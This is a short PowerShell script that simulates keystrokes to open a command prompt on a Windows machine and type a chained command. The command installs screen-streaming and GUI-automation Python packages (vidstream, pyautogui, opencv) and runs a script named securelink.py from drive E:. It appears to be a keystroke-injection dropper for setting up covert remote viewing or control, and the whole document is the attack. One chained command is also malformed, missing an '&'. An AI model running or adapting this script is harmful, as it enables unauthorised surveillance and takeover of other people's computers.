# Activating the Windows Key
Add-Type -AssemblyName System.Windows.Forms
[System.Windows.Forms.SendKeys]::SendWait('^{ESC}')

Add-Type -AssemblyName System.Windows.Forms    
timeout 2
'cmd'.ToCharArray() | ForEach-Object {[System.Windows.Forms.SendKeys]::SendWait($_)}

$wshell = New-Object -ComObject wscript.shell

$wshell.SendKeys("{ENTER}")

timeout 2
$wshell.SendKeys("pip install opencv-python & pip install pyautogui & pip install bs4 & pip install vidstream & pip install requests pip install Pillow --upgrade & python E:\securelink.py")

$wshell.SendKeys("{ENTER}")